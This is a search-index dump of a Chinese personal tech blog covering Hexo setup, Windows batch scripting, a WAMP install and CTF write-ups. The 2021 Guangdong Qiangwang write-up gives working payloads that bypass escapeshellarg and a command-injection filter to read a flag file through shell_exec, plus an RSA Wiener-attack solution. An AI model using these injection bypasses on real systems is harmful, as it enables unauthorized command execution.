sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;echo serialize($_SESSION).&quot;&lt;br/&gt;&quot;;$serialize_info = filter(serialize($_SESSION));echo $serialize_info.&#x27;&lt;br/&gt;&#x27;;$userinfo = unserialize($serialize_info);var_dump($userinfo);echo &#x27;&lt;br/&gt;&#x27;;echo base64_decode($userinfo[&#x27;img&#x27;]);","categories":[{"name":"CTF","slug":"CTF","permalink":"https://vvmdx.github.io/categories/CTF/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://vvmdx.github.io/tags/WriteUp/"}]},{"title":"Hexo搭建pure主题博客若干问题","slug":"2021-11-02-Hexo搭建pure主题博客若干问题","date":"2021-11-01T16:00:00.000Z","updated":"2021-12-01T10:32:24.290Z","comments":true,"path":"2021/11/02/2021-11-02-Hexo搭建pure主题博客若干问题/","link":"","permalink":"https://vvmdx.github.io/2021/11/02/2021-11-02-Hexo%E6%90%AD%E5%BB%BApure%E4%B8%BB%E9%A2%98%E5%8D%9A%E5%AE%A2%E8%8B%A5%E5%B9%B2%E9%97%AE%E9%A2%98/","excerpt":"自己摸索了好久结果发现还是别人写好的好用…","text":"自己摸索了好久结果发现还是别人写好的好用… Hexo+pure+Typora+PicGo+jsDelivr+Github快捷打造/优化个人博客 框架：Hexo+Github Pages 主题：pure 写作工具：Typora 图床：PicGo CDN（快速加载图片）：jsDelivr 没想到短短两天我连续更新优化了好几次博客…最后感觉可以把我之前写的一篇个人博客搭建的也一起整合进来，教程之类的感觉我也写的不是很详细（而且懒…），我就直接给个我觉得写的好的参考链接了 Github Pages Github在这里面起两个作用：一个是作为博客的仓库，一个是作为图床的仓库 先说作为博客的仓库 Github =&gt; new repository（记得是公开的） =&gt; repository name填写域名 域名格式：username.github.io 这个github pages的username如果和自己github的id不一致好像会有点问题，具体是什么问题倒是忘了… username就是你github的名字，要是对自己github名字不满意可以搜一下怎么改名字（右上角settings=&gt;Profile=&gt;Name，这个只是你的名片上的名字，Profile下面有个Account，Account=&gt;Change username才是你的github名字） 创建后进入仓库，仓库名下面一排东西，最后面那个settings点进去，拉下去有个pages，中间有个选择主题，随便选一个commit后，访问你的username.github.io就可以看到页面了 除此之外还可以绑定自己的域名啦什么的其他操作 Hexo 搭建完一个简易的Github Pages后，就可以换个好看且适合自己的主题了，常见的静态模板系统有Jekyll、Hexo、Hugo、Pelican、Docify（这个好像用来记笔记写文档比较多）等，这里我用了Hexo Hexo中文文档：https://hexo.io/zh-cn/docs （真的写的很详细了…完全可以不用看其他博客） 环境：git + node.js（安装不赘述） node建议使用较新的版本，我在使用旧版本安装后编译时总是报错，换了新版本后就没问题了，windows下直接官网下载新版本覆盖旧版本就行 Hexo安装 使用npm安装 1234npm install -g hexo-cli# 若npm install卡住不动可以换成淘宝镜像npm config get registry # 查看当前下载源npm config set registry https://registry.npm.taobao.org # 更换为淘宝源 初始化 1hexo init blog 效果如下，在目录下会出现blog文件夹 检测搭建效果 123hexo new test # 创建一个test.md的文章hexo g # g=generate 生成静态文件hexo s # s=server 启动服务器 命令执行效果 启动后可访问http://localhost:4000查看 推送/部署网站 打开根目录_config.yml，翻到最下面修改deploy信息 repo：github仓库完整地址，最后要加上.git branch：分支，默认是master或者main，这里的wmdx是我自己改的分支 1234deploy: type: git repo: https://github.com/vvmdx/vvmdx.github.io.git branch: wmdx 安装git部署插件 1npm install hexo-deployer-git --save 推送/部署主页 123hexo clean # 清除缓存和已生成的静态文件hexo ghexo d # d=deploy 推送/部署 执行完成后访问个人网站就能看到主页已经上线了 一些插件 本节可直接跳过…后面的主题介绍其实都有 文章字数统计及阅读时长预计 1npm install hexo-wordcount --save 站内搜索 1npm install hexo-generator-json-content --save 自动压缩html、css、js代码 1npm install hexo-neat --save 站点地图 1npm install hexo-generator-sitemap --save 推送Hexo博客新连接至百度搜索引擎 https://github.com/huiwang/hexo-baidu-url-submit 1npm install hexo-baidu-url-submit --save 配置：一个很坑的地方，type如果有两个然后不加横杠，会报错，加了横杠但是放在连续的两行也会报错，一定要像下面这样配置 12345deploy:- type: git repo: https://github.com/vvmdx/vvmdx.github.io.git branch: wmdx- type: baidu_url_submitter Pure主题 更换主题 Hexo官方主题：https://hexo.io/themes/ pure设计者：https://blog.cofess.com/ pure文档：https://github.com/cofess/hexo-theme-pure 下载主题到blog/themes/pure git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 打开根目录_config.yml更改主题 theme: landscape -&gt; theme: pure 更新 hexo clean hexo d 这时你的主题就已经更新完毕了，效果如下 Pure主题优化 此时一个最简易的博客已经搭起来了，这时就需要让这个博客有自己特色的东西了 参考1：https://hwame.top/20200520/hello-hexo-troubleshooting.html 参考2~n：看参考1就完事了，他里面也记录了参考别人的一些优化方式，我感觉应该能够满足绝大多数要求了吧 参考了好几个大神的优化记录，感觉这个博客是讲的最详细的了，而且都不会出问题（亲测，出问题那一定是自己的原因= =），基本所有你需要改的地方都能在里面找到（我自己改了超级多，比如行内代码样式、代码块一键复制、回到顶部等乱七八糟的），可以根据自己喜好搞的花里胡哨的 改的时候建议本地debug一下…我一次性把想改的全改了，结果deploy上去发现生成不出来页面，心态都炸了不知道要去哪找原因，结果发现hexo是可以debug的 方法：hexo根目录下命令行hexo s --debug就可以进入debug模式，然后访问localhost:4000就可以开始debug了 比如我就是在debug的时候发现我出错的原因是一个修改好了的文件没有保存…导致生成的页面获取不到属性（配置文件出错==&gt;build失败==&gt;页面空白） 还有就是关于前端的调试，有的xd可能想要微调，结果每次调都要重新hexo clean、hexo g很麻烦，其实可以不用的，直接本地开启debug后，在前端打开开发者工具，选中你想更改的样式，在chrome开发者工具里面直接修改就行（会实时映射到页面），一直微调到自己想要的效果，再把修改的内容写到配置文件中就行了 PicGo图床 优化完了博客，在我们写博客的时候会发现图片的管理十分糟糕，如果使用本地资源，就要复制一份到hexo的部署目录里面，十分麻烦，PicGo是一个可以给你提供图片url的东西，我们可以联动Typora+PicGo+Github来打造方便的图床环境 PicGo+Github+jsDelivr配置 PicGo：https://github.com/Molunerfinn/PicGo/releases 下完了长这样 选择图床设置=&gt;Github图床（我用的是GitHub） 首先要去Github new一个仓库用来放图，（PicGo的作用可以理解为帮你把图片push到你的github存图仓库里，并给你返回一个图片的url） 仓库就随便new一个公开的就行，网上说还要什么版本号，其实可以不用（反正我只是用作博客的图床），如果有其他需求就要搞个release，不然他就默认获取最新的仓库 然后获取个token Settings–&gt;Developer settings–&gt;Personal access tokens–&gt;Generate new token-&gt;勾选select scopes中的repo，完了就生成个token，把token复制下来（记得复制下先粘贴，这个token关掉后就不会再显示了） 回到PicGo 仓库名：username/reponame 分支名：你喜欢 token：刚刚复制的 存储路径：在你仓库下的路径，不存在他就会帮你创建一个，也是随便写 自定义域名：jsDelivr jsDelivr配置： 官网：https://www.jsdelivr.com/?docs=gh 完全不用配置，只要直接用形如https://cdn.jsdelivr.net/gh/user/repo@version/file的url就行了 在PicGo里面填的则是https://cdn.jsdelivr.net/gh/vvmdx/reponame@main/ 然后就完事了，点确定后设为默认图床，你可以随便丢一张图上去，然后他就会给你个url，访问url就可以看到图了，同时你会在自己的github仓库里看到img文件夹下多了一张图 Typora配置： 按图里配就完事，选PicGo app（你要是用的是PicGo-Core就另说），然后就是exe的位置，上面选复制后自动上传 完事，接下来你在typore写东西时，只要复制图片进来，就自动给你上传到图床上了（其实我个人而言并没觉得很方便，因为有的笔记我不想发到博客上，所以要在本地写，这时就要自己再把配置改回来…只有在写博的时候才会用图床） PicGo上传出问题 再补充一点：上传的图片不能同名，不然会上传出错（我愣是被卡了好久） 以下是以前写的（其实完全可以不用看，直接照着大神博客改就完事了 今天本来是打算看下次组会汇报的论文的，看了半个早上实在头大，开始逛起了github，突然想到我的博客一些bug和样式问题之前因为懒得翻前端代码一直没管，于是乎决定动手把博客一些功能给完善一下 话说为了确保不是自己之前乱改出的问题，我还把原项目重新clone了一份对比… 疑难杂症 点击首页左侧边栏跳到404 记得把D:\\hexo\\themes\\pure\\_source下的categories、tags和其他主页侧边栏有出现的东西复制到D:\\hexo\\\\source下，不然他不会编译成index.html，打开就会404 开启不蒜子后文章出现两个眼睛（两个统计阅读量的地方） 看网页源码可发现busuanzi和leancloud的文章统计都被开启，即使我们配置文件里面将leancloud设为false，他也会编译出来，只要将D:\\hexo\\themes\\pure\\layout_partial\\post下的pv.ejs中leancloud部分全部删掉就可以了，只留下busuanzi的（如果启用leancloud的话就留下leancloud） 123456789## pv.ejs&lt;% if (theme.pv.busuanzi.enable) &#123; %&gt; &lt;span class=&quot;article-read hidden-xs&quot;&gt; &lt;i class=&quot;icon icon-eye-fill&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt; &lt;span id=&quot;busuanzi_container_page_pv&quot;&gt; &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;0&lt;/span&gt; &lt;/span&gt; &lt;/span&gt;&lt;% &#125; %&gt; 修改首页左边栏底部消息 修改D:\\hexo\\themes\\pure\\layout\\common下的footer.ejs 123456789101112131415&lt;footer class=&quot;footer&quot; itemscope itemtype=&quot;http://schema.org/WPFooter&quot;&gt; &lt;%- partial(&#x27;_common/social&#x27;, null, &#123;cache: !config.relative_link&#125;) %&gt; &lt;% if (theme.pv.busuanzi.enable) &#123; %&gt; &lt;span class=&quot;article-read hidden-xs&quot;&gt; &lt;i class=&quot;icon icon-eye-fill&quot; aria-hidden=&quot;true&quot;&gt; &lt;a style=&quot;font-size: 12px;&quot;&gt; 总阅读量： &lt;/a&gt; &lt;/i&gt; &lt;span id=&quot;busuanzi_container_page_pv&quot;&gt; &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;0&lt;/span&gt; &lt;/span&gt; &lt;/span&gt; &lt;% &#125; %&gt;&lt;/footer&gt; 首页页脚翻页标签问题 在首页的卡片数量超过10个后，就开始需要翻页，但是在上一页和下一页的地方，会出现标签&lt;i class=&quot;icon icon-angle-left&quot;&gt;&lt;/i&gt;没有被解析的情况 解决： 位置：…/theme/pure/layout/_partial/pagination.ejs 左边为改完结果，右边为原版 1234567&lt;%- paginator(&#123; prev_text: &#x27;&lt;%- paginator(&#123; prev_text: &#x27;&lt;i class=&quot;icon icon-angle-left&quot;&gt;&lt;/i&gt; &#x27; + __(&#x27;pagination.prev&#x27;), next_text: __(&#x27;pagination.next&#x27;) + &#x27; &lt;i class=&quot;icon icon-angle-right&quot;&gt;&lt;/i&gt;&#x27; &#125;) %&gt; &#x27; + __(&#x27;pagination.prev&#x27;), next_text: __(&#x27;pagination.next&#x27;) + &#x27; &lt;i class=&quot;icon icon-angle-right&quot;&gt;&lt;/i&gt;&#x27;&#125;) %&gt; 原来的这段选择器用字符标签拼接，在当前页有下一页的时候，在“ 下一页 ”后显示一个“ &gt; ”的图标，在当前页有上一页时，在“ 上一页 ”前显示一个“ &lt; ”的图标，但是实际上这里没有被解析出来，导致最终&lt;i class=&quot;icon icon-angle-left&quot;&gt;&lt;/i&gt;整句会被直接打印到页面，这里的解决方式也直接简单粗暴，把两个标签去掉就行了，虽然这样会导致不够美观，，，但是毕竟不影响使用，这个坑等以后再继续填了 不蒜子计数问题 不蒜子的计数官网描述如下： 引入busuanzi.js 12&lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; 安装标签 12345678// pv的方式，单个用户连续点击n篇文章，记录n次访问量&lt;span id=&quot;busuanzi_container_site_pv&quot;&gt; 本站总访问量&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;// uv的方式，单个用户连续点击n篇文章，只记录1次访客数&lt;span id=&quot;busuanzi_container_site_uv&quot;&gt; 本站访客数&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;人次&lt;/span&gt; 在pure里的问题：其实在pure里面没什么问题，，，，因为pure的作者做的不蒜子是放在单篇文章里的，而我把全站的访问量给提了出来，放在左侧边栏的底部，效果如下 但是这会出现一个问题：只有“首页”这个选项卡有这个，“归档”、“标签”这些选项卡都没有，于是修改下面的配置 位置：…/theme/pure/layout/_common/footer.ejs 左边为改完的，右边为原版 添加了如下代码，其实也就是和官网的用法一样了，引入js后，添加两个标签 123456789101112&lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;&lt;%- partial(&#x27;_common/social&#x27;, null, &#123;cache: !config.relative_link&#125;) %&gt;&lt;% if (theme.pv.busuanzi.enable) &#123; %&gt; &lt;span id=&quot;busuanzi_container_site_pv&quot;&gt; 总阅读量：&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次 &lt;/span&gt; &lt;br /&gt; &lt;span id=&quot;busuanzi_container_site_uv&quot;&gt; 总访客数：&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;位 &lt;/span&gt; 但是这会导致另一个问题，由于pure本身每个页面就都有不蒜子，因此如果我们直接修改这一个配置的话，会导致我们具体的博客页面访问了两次不蒜子，（听起来好像是涨阅读量的好方法）实际上访问两次后并不会回显到页面上！（我也不知道为什么，可以在你的某篇博客页面上打开开发者工具，选择network选项卡，然后刷新一下页面，你会发现访问了两次busuanzi的接口（下面是一次接口的效果），返回的三个参数site_uv是全站访问人数，page_pv是某篇文章的访问次数，site_pv是全站访问次数 修复方法也很简单，把原版的不蒜子接口注释掉就行了（雾 位置：…/theme/pure/layout/_script/pv.ejs 1234&lt;%# ejs文件用这个东西注释代码 %&gt;&lt;% if (theme.pv.busuanzi.enable) &#123; %&gt; &lt;%# &lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; %&gt;&lt;% &#125; %&gt; 其他一些暂时没发现大毛病了，，等以后有空再看看怎么优化了，真没想到这一搞一个下午又没了…","categories":[{"name":"学点东西","slug":"学点东西","permalink":"https://vvmdx.github.io/categories/%E5%AD%A6%E7%82%B9%E4%B8%9C%E8%A5%BF/"}],"tags":[{"name":"博客","slug":"博客","permalink":"https://vvmdx.github.io/tags/%E5%8D%9A%E5%AE%A2/"}]},{"title":"Windows批处理","slug":"2021-10-23-Windows批处理","date":"2021-10-22T16:00:00.000Z","updated":"2021-10-23T05:10:16.175Z","comments":true,"path":"2021/10/23/2021-10-23-Windows批处理/","link":"","permalink":"https://vvmdx.github.io/2021/10/23/2021-10-23-Windows%E6%89%B9%E5%A4%84%E7%90%86/","excerpt":"","text":"Windows批处理 本来只打算抄个批处理的脚本做windows下jdk版本的快速切换，在写的时候发现了批处理脚本和语法还挺有趣的，感觉有些甚至可以应用到安全中，遂记录下一些有趣的东西 https://github.com/vvmdx/changeYourJDK 这是我编写的批处理切换jdk的脚本 用户变量和系统变量 一般来说windows的环境变量包括了用户变量和系统变量，用户变量对当前的用户起作用，系统变量对所有用户起作用 一般的环境变量优先级是用户变量 &gt; 系统变量，也就是说会优先从用户变量中寻找值，找不到再去系统变量中寻找，举个例子： 可以看到对于用户变量和系统变量中都出现的TEMP和TMP变量，若当前为用户权限，则会先在用户变量中寻找对应的值，若在用户变量中找不到，例如windir，则会去系统变量中查找 而Path这个变量比较奇葩，他是优先从系统变量找起，再找到用户变量，如果你用echo %path%将环境变量打印出来，将会发现打印的顺序是从系统变量Path的第一个开始，一直打印到用户变量Path的最后一个，举个例子： 可以看到，虽然我们打印出来的JAVA_HOME是jdk11.0.3，为用户变量的值，但是java -version显示的是系统变量里的jdk1.8.0_291 总结： 一般来说环境变量调用优先级 用户变量 &gt; 系统变量 Path变量优先级 系统变量 &gt; 用户变量 @echo off @：关闭其后命令的回显 echo off：关闭其他所有命令的回显 pause：用于暂停程序，防止批处理运行完直接退出 当无@echo off指令时 1234echo this is a testecho %JAVA_HOME%where javapause 将以上保存为bat并执行，效果如下，可以看到相当于分别执行了4条指令 当echo off没有@时 12345echo offecho this is a testecho %JAVA_HOME%where javapause 批处理执行如下，可以看到只有第一条指令有回显 当使用@echo off时 12345@echo offecho this is a testecho %JAVA_HOME%where javapause 可以看到@echo off这一行也没了，只有剩下的内容，这正是我们希望的效果 set和setx set和setx都是设置环境变量，不过set只针对于当前的cmd窗口，而setx是直接修改全局（注册表）环境变量 以下是windows对set和setx的描述 1234::set显示、设置或删除 cmd.exe 环境变量。::setx在用户或系统环境创建或修改环境变量。能基于参数、注册表项或文件输入设置变量。 set 当使用set修改环境变量时 可以看到在当前cmd窗口的JAVA_HOME变量已经被修改，这时当我们另开一个cmd窗口时，就会像下面这样 可以发现并没有在全局生效 setx 当使用setx修改环境变量时 1234:: 下面这条只能对用户变量生效setx JAVA_HOME D:\\DevelopTools\\Java\\jdk1.8.0_291:: 加上/M才能对环境变量生效setx JAVA_HOME D:\\DevelopTools\\Java\\jdk1.8.0_291 /M 判断运行当前bat的用户权限 net session net session用于连接、删除或查看本机与其他机器的网络连接，需要管理员权限才可以查看 访问需要管理员权限的路径 %SYSTEMROOT%\\system32\\config\\system md(make directory) &amp; rd(remove directory) 创建目录、删除目录，若目录为系统路径，则需要管理员权限 首先用普通权限创建目录md %windir%\\system32\\aaatestaaa，可以看到拒绝访问 接着用管理员权限创建目录，创建成功 用这个方法虽然也可以判断，但是只能判断一次，因为创建后再次尝试创建时，普通用户和管理员都会返回一样的结果；因此如果要通过此方法判断管理员权限，需要结合rd（删除目录）的指令 上面的是普通用户，下面是管理员用户，其实就是在创建目录后再将其删除，普通用户没权限，管理员创建后会删除，就达到了可以一直进行判断的效果 重定向之&gt;nul &gt; ，&gt;&gt;：输出重定向，echo 123&gt;test.txt将把123输出到文件test.txt中，若文件已存在，则首先删除该文件的信息，再写入123；若文件不存在，则会先创建文件，再写入 &gt;nul：将输出重定向到空，也就是不会打印到dos界面，可以达到屏蔽输出的效果 1&gt;nul：屏蔽正确执行命令的输出 2&gt;nul：屏蔽错误执行命令的输出 可以看到普通用户下net session执行错误，当使用2&gt;nul时屏蔽了错误输出 管理员权限下net session执行成功，当使用1&gt;nul时屏蔽了正确输出 ||与&amp;&amp; &amp;&amp;表示它前面的语句成功执行的话将执行后面的语句 ||表示它之前的语句执行失败将执行后面的语句 两者组和可以实现if…else…的效果 可以看到当普通用户net session执行失败的情况下，使用||就会执行后面的语句；当管理员net session执行成功的情况下，使用&amp;&amp;会执行后面的语句 PsTools 官网下载：https://docs.microsoft.com/en-us/sysinternals/downloads/pstools PsTools是一组能实现安全管理的套件，其中PsExec.exe可以打开system权限的进程 可以看到在开启system权限前，即使是管理员权限的cmd，打印的环境变量也是用户变量；但是system权限的cmd，打印的环境变量已经变成了系统变量","categories":[{"name":"小工具&小脚本","slug":"小工具-小脚本","permalink":"https://vvmdx.github.io/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7-%E5%B0%8F%E8%84%9A%E6%9C%AC/"}],"tags":[{"name":"自编工具&脚本","slug":"自编工具-脚本","permalink":"https://vvmdx.github.io/tags/%E8%87%AA%E7%BC%96%E5%B7%A5%E5%85%B7-%E8%84%9A%E6%9C%AC/"}]},{"title":"Windows+Apache+Mysql+PHP手动搭建","slug":"2021-10-18-Windows+Apache+Mysql+PHP手动搭建","date":"2021-10-17T16:00:00.000Z","updated":"2021-10-18T01:20:43.553Z","comments":true,"path":"2021/10/18/2021-10-18-Windows+Apache+Mysql+PHP手动搭建/","link":"","permalink":"https://vvmdx.github.io/2021/10/18/2021-10-18-Windows+Apache+Mysql+PHP%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BA/","excerpt":"","text":"Windows+Apache+Mysql+PHP手动搭建 ​ 不使用phpStudy、WAMP等集成环境的原因是本机已经装了mysql了，上一台机器在已有mysql的情况下装集成环境造成环境十分混乱，而且集成环境出问题时往往很难定位是哪里出问题，因此打算手动搭建 环境： windows 10 Apache-httpd-2.4.51-win64-VS16 php-8.0.11-Win32-vs16-x64 MySQL Ver 8.0.25 for Win64 on x86_64 Apache搭建 配置文件 Windows下的apache去https://www.apachelounge.com/download/下载压缩包，解压后修改conf/httpd.conf配置文件以下内容 12345Define SRVROOT &quot;D:/DevelopTools/Apache-httpd-2.4.51-win64-VS16/Apache24&quot;DocumentRoot &quot;D:/Programming/php/www&quot;&lt;Directory &quot;D:/Programming/php/www&quot;&gt;ServerName localhostListen 80 ServerRoot 服务器位置，设置为apache在本机的位置 DocumentRoot 作用：确定服务器上访问的位置，即网站文件夹所在位置 &lt;Directory &quot;”&gt; 作用：设置可访问路径，与DocumentRoot一致即可 ServerName 作用：方便用户使用名字访问对应网站，给文件夹对应的取一个别名 去掉注释，端口可以去掉 Listen 作用：设置监听端口 C:\\Windows\\System32\\drivers\\etc\\hosts DNS解析，增加条目127.0.0.1 localhost 启动服务 配置完成后进入安装目录的bin目录下，用管理员身份打开cmd 123456789101112131415# 检查配置是否成果D:\\...\\Apache24\\bin&gt;httpd.exe -tSyntax OK# 启动服务D:\\...\\Apache24\\bin&gt;httpd -k start[Sun Oct 17 16:11:37.803811 2021] [mpm_winnt:error] [pid 27336:tid 408] (OS 2)系统找不到指定的文件。 : AH00436: No installed service named &quot;Apache2.4&quot;.# 若报以上错误则执行以下命令D:\\...\\Apache24\\bin&gt;httpd -k installInstalling the &#x27;Apache2.4&#x27; serviceThe &#x27;Apache2.4&#x27; service is successfully installed.Testing httpd.conf....Errors reported here must be corrected before the service can be started.# 执行成功再启动D:\\...\\Apache24\\bin&gt;httpd -k start# 访问localhost 即可看到页面 PHP环境搭建 官网下载地址：https://windows.php.net/download/ 下载压缩包后解压缩 根目录下的php.exe即为php解释器，命令行运行php.exe -f 文件名即可解析php文件 Apache+PHP Apache加载PHP模块 Apache配置文件httpd.conf添加以下 1234567891011#加载phpLoadModule php_module &#x27;D:/DevelopTools/php-8.0.11/php8apache2_4.dll&#x27;#分配给phpAddType application/x-httpd-php .php# 进入Apache24/bin# 查看语法是否正确D:\\...\\Apache24\\bin&gt;httpd.exe -tSyntax OK# 重启D:\\...\\Apache24\\bin&gt;httpd -k restart 可以看到php已经成功解析 Apache加载PHP配置文件 将php.ini-development原地复制一份，改名为php.ini Apache配置文件添加php配置文件路径 123456789#加载php配置文件，目录到php.ini所在目录即可PHPIniDir &#x27;D:/DevelopTools/php-8.0.11&#x27;# 进入Apache24/bin# 查看语法是否正确D:\\...\\Apache24\\bin&gt;httpd.exe -tSyntax OK# 重启D:\\...\\Apache24\\bin&gt;httpd -k restart 查看配置文件是否已加载 1234&lt;?php echo &quot;hello&quot;; phpinfo();?&gt; 在Loaded Configuration File处看到已经加载了配置文件 时区设定 123# php.inidate.timezone = PRC# 重启Apache 可以看到时区已经设定为中国时区 注意1：由于php的配置文件被加载在Apache中，因此每次对php.ini配置文件的修改都要重启Apache才会生效 注意2：配置文件中的路径要使用斜杠而不是反斜杠！如果直接从电脑复制路径默认是反斜杠，反斜杠会导致加载不了路径！ PHP+MySQL MySQL安装配置就不赘述了… PHP加载MySQL扩展 修改php.ini 1234# 找到这一行，去掉分号注释extension=mysqli# 增加扩展路径extension_dir = &quot;D:/DevelopTools/php-8.0.11/ext&quot; 重启Apache 检查php环境：phpinfo() 可以看到已加载mysql模块 配置虚拟主机 Apache 配置文件httpd.conf 123456# 包含虚拟主机配置文件Include conf/extra/httpd-vhosts.conf# 加载模块，这是Apache2.4的特性，它使用了mod_authz_hosts实现访问控制，同时提供mod_access_compat兼容旧语句LoadModule access_compat_module modules/mod_access_compat.so# 没有上面这行会报错Invalid command &#x27;Order&#x27;, perhaps misspelled or defined by a module not included in the server configuration Apache 虚拟主机配置文件…/Apache24/conf/extra/httpd-vhosts.conf 1234567891011121314151617# 注释掉其他两个没用的，只剩一个&lt;VirtualHost *:80&gt; # 本机目录 DocumentRoot &#x27;D:/Programming/php/www/myTest&#x27; # 虚拟域名 ServerName www.myTest.com # 访问控制 &lt;Directory &quot;D:/Programming/php/www/myTest&quot;&gt; Order Deny,Allow Deny from all Allow from all # 列表显示（开发环境），访问根目录时不会报403 Options Indexes FollowSymLinks # 指定默认访问文件（访问根目录时跳转） DirectoryIndex index.html index.htm index.php &lt;/Directory&gt;&lt;/VirtualHost&gt; DNS解析：修改hosts文件，添加一行：127.0.0.1 www.myTest.com 访问 www.myTest.com，可以看到成功解析 当配置完成后会发现访问localhost也会跳转到这里，此时只要再多配一个虚拟主机即可 到这里就完成所有配置了，关闭Apache服务 123D:\\...\\Apache24\\bin&gt;httpd -k stopThe &#x27;Apache2.4&#x27; service is stopping.The &#x27;Apache2.4&#x27; service has stopped.","categories":[{"name":"系统&工具&环境配置","slug":"系统-工具-环境配置","permalink":"https://vvmdx.github.io/categories/%E7%B3%BB%E7%BB%9F-%E5%B7%A5%E5%85%B7-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"}]},{"title":"2021广东省强网团体赛-wp","slug":"2021-10-16-2021广东省强网团体赛-wp","date":"2021-10-15T16:00:00.000Z","updated":"2021-10-16T12:45:34.319Z","comments":true,"path":"2021/10/16/2021-10-16-2021广东省强网团体赛-wp/","link":"","permalink":"https://vvmdx.github.io/2021/10/16/2021-10-16-2021%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E5%9B%A2%E4%BD%93%E8%B5%9B-wp/","excerpt":"","text":"2021广东省强网团体赛-wp WEB-love_Pokemon 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phperror_reporting(0);highlight_file(__FILE__);$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123; mkdir($dir);&#125;function DefenderBonus($Pokemon)&#123; if(preg_match(&quot;/&#x27;| |_|\\\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\\\\\|p|h|u|v|\\\\+|\\\\^|\\`|\\~|\\||\\&quot;|\\&lt;|\\&gt;|\\=|&#123;|&#125;|\\!|\\&amp;|\\*|\\?|\\(|\\)/i&quot;,$Pokemon))&#123; die(&#x27;catch broken Pokemon! mew-_-two&#x27;); &#125; else&#123; return $Pokemon; &#125;&#125;function ghostpokemon($Pokemon)&#123; if(is_array($Pokemon))&#123; foreach ($Pokemon as $key =&gt; $pks) &#123; $Pokemon[$key] = DefenderBonus($pks); &#125; &#125; else&#123; $Pokemon = DefenderBonus($Pokemon); &#125;&#125;switch($_POST[&#x27;myfavorite&#x27;] ?? &quot;&quot;)&#123; case &#x27;picacu!&#x27;: echo md5(&#x27;picacu!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); break; case &#x27;bulbasaur!&#x27;: echo md5(&#x27;miaowa!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); $level = $_POST[&quot;levelup&quot;] ?? &quot;&quot;; if ((!preg_match(&#x27;/lv100/i&#x27;,$level)) &amp;&amp; (preg_match(&#x27;/lv100/i&#x27;,escapeshellarg($level))))&#123; echo file_get_contents(&#x27;./hint.php&#x27;); &#125; break; case &#x27;squirtle&#x27;: echo md5(&#x27;jienijieni!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); break; case &#x27;mewtwo&#x27;: $dream = $_POST[&quot;dream&quot;] ?? &quot;&quot;; if(strlen($dream)&gt;=20)&#123; die(&quot;So Big Pokenmon!&quot;); &#125; ghostpokemon($dream); echo shell_exec($dream);&#125;?&gt; 思路： 当post参数myfavorite=bulbasaur!时，接收一个post参数levelup，经过if判断后可以获得hint 难点：不能被lv100匹配到，又要在escapeshellarg匹配lv100 escapeshellarg作用是转义shell的输入 绕过方法：ascii %80之后的都会被去掉，即escapeshellarg(lv%fa100) -&gt; lv100 payload：myfavorite=bulbasaur!&amp;levelup=lv%fa100 这里讲的很详细 hint提示flag在根目录下，名字叫FLAG 当post参数myfavorite=mewtwo时，接受参数dream，传参到ghostpokemon再传参到DefenderBonus，经过正则后返回参数的值，将dream的参数值作为shell执行 难点：dream的值即为读取flag命令的值，因此要将该shell绕过正则 读取内容的命令： cat /FLAG：a、L、A被过滤了，cat用不了 cat -&gt; od命令：读取内容，输出为八进制，可以用 /FLAG -&gt; /F[0-Z][0-Z]G：[]为文件名通配符，用来匹配指定范围内的任意单个字符 效果如下： payload：myfavorite=mewtwo&amp;dream=od%09/F[0-Z][0-Z]G 读取八进制结果后解码即可 Crypto-RSA and BASE？ 1234567RSA:n=56661243519426563299920058134092862370737397949947210394843021856477420959615132553610830104961645574615005956183703191006421508461009698780382360943562001485153455401650697532951591191737164547520951628336941289873198979641173541232117518791706826699650307105202062429672725308809988269372149027026719779368169e=36269788044703267426177340992826172140174404390577736281478891381612294207666891529019937732720246602062358244751177942289155662197410594434293004130952671354973700999803850153697545606312859272554835232089533366743867361181786472126124169787094837977468259794816050397735724313560434944684790818009385459207329c=137954301101369152742229874240507191901061563449586247819350394387527789763579249250710679911626270895090455502283455665178389917777053863730286065809459077858674885530015624798882224173066151402222862023045940035652321621761390317038440821354117827990307003831352154618952447402389360183594248381165728338233BASE:&quot;GHI45FQRSCX****UVWJK67DELMNOPAB3&quot; 思路： RSA部分 e很大，使用wiener attack，网上有脚本可以用，改下参数即可，github地址 解出d的值 1d=162629853458911971486680889045849898679792335644886630492453366486865526390781 和n、c拿去解密 123456789c=d=n=m=pow(c,d,n)print long_to_bytes(m)----------------------flag&#123;TCMDIEOH2MJFBLKHT2J7BLYZ2WUE5NYR2HNG====&#125; Base部分 观察了一下结果，4个等号（base64最多只会有3个等号）、全是大写字母、有数字出现都说明了这是base32编码，直接拿去解码发现是乱码，看下附件的第二个内容 